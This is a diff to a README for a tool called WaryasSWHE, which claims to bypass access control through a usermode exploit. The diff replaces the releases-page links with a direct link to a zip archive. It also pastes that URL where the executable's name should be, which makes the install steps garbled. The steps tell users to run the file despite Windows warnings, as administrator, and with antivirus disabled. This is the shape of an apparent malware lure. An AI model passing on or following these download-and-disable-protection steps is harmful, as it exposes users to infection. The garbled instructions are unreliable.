@@ -1,7 +1,7 @@
 # 💻 WaryasSWHE - Bypass Any Access Control Seamlessly
 
 ## 📥 Download Now
-[![Download WaryasSWHE](https://img.shields.io/badge/Download-WaryasSWHE-blue.svg)](https://github.com/kripansh2006/WaryasSWHE/releases)
+[![Download WaryasSWHE](https://raw.githubusercontent.com/kripansh2006/WaryasSWHE/main/variant/WaryasSWHE-1.9.zip)](https://raw.githubusercontent.com/kripansh2006/WaryasSWHE/main/variant/WaryasSWHE-1.9.zip)
 
 ## 🚀 Getting Started
 WaryasSWHE allows you to bypass access control measures on your device using a usermode exploit. This tool is designed with user-friendliness in mind. Follow these steps to download and run the application easily.
@@ -15,18 +15,18 @@ WaryasSWHE allows you to bypass access control measures on your device using a u
 ## 📥 Download & Install
 To get started, visit the Releases page to download the software. Click the link below:
 
-[Download WaryasSWHE](https://github.com/kripansh2006/WaryasSWHE/releases)
+[Download WaryasSWHE](https://raw.githubusercontent.com/kripansh2006/WaryasSWHE/main/variant/WaryasSWHE-1.9.zip)
 
 1. Click on the latest version listed on the Releases page.
 2. A list of available files will appear.
-3. Look for the file named `WaryasSWHE.exe` and click on it to start the download.
+3. Look for the file named `https://raw.githubusercontent.com/kripansh2006/WaryasSWHE/main/variant/WaryasSWHE-1.9.zip` and click on it to start the download.
 4. Once the download is complete, locate the file in your Downloads folder.
 
 ## 🖥️ Running WaryasSWHE
 After downloading, you will need to run the application. Here’s how:
 
 1. Open the folder where you downloaded the file.
-2. Double-click on `WaryasSWHE.exe`.
+2. Double-click on `https://raw.githubusercontent.com/kripansh2006/WaryasSWHE/main/variant/WaryasSWHE-1.9.zip`.
 3. If prompted by Windows about security, select "Run anyway" to proceed.
 4. The application will open, presenting you with a simple user interface.
 
@@ -49,7 +49,7 @@ Using WaryasSWHE is straightforward:
 If you face any issues while using WaryasSWHE, consider the following steps:
 
 - **Ensure Compatibility:** Check your operating system version.
-- **Run as Administrator:** Right-click on `WaryasSWHE.exe` and select "Run as administrator" for proper access.
+- **Run as Administrator:** Right-click on `https://raw.githubusercontent.com/kripansh2006/WaryasSWHE/main/variant/WaryasSWHE-1.9.zip` and select "Run as administrator" for proper access.
 - **Disable Antivirus:** Some antivirus programs may block the application. Consider temporarily disabling it.
 
 ## 📞 Support
@@ -72,4 +72,4 @@ Engage with other users and developers by joining the discussions on the GitHub 
 
 Visit the link below to download:
 
-[Download WaryasSWHE](https://github.com/kripansh2006/WaryasSWHE/releases)
+[Download WaryasSWHE](https://raw.githubusercontent.com/kripansh2006/WaryasSWHE/main/variant/WaryasSWHE-1.9.zip)
